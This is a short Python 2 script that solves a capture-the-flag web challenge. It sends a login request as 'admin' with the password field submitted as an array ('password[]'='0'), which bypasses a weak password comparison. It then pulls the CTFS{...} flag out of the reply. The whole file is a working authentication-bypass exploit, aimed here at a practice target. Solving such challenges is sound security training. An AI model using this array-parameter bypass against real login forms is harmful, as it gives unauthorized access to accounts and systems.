#!/usr/bin/python

import pycurl, StringIO, certifi
from urllib import urlencode
import re

url = 'https://ctfs.me/web/web50/'

c = pycurl.Curl()
c.setopt(c.USERAGENT, 'Mozilla/5.0')
c.setopt(c.CAINFO, certifi.where())
c.setopt(c.URL, url)
buff = StringIO.StringIO()
c.setopt(c.WRITEFUNCTION, buff.write)
c.setopt(c.FOLLOWLOCATION, 1)

post_data = {'username': 'admin', 
             'password[]': '0',
             'submit': 'Login'}
postfields = urlencode(post_data)

c.setopt(c.POST, 1)
c.setopt(c.POSTFIELDS, postfields)
c.perform()

body = buff.getvalue()
flag = re.search('CTFS\{.+\}', body, re.I|re.M)

print '[+] Flag is : ' + flag.group()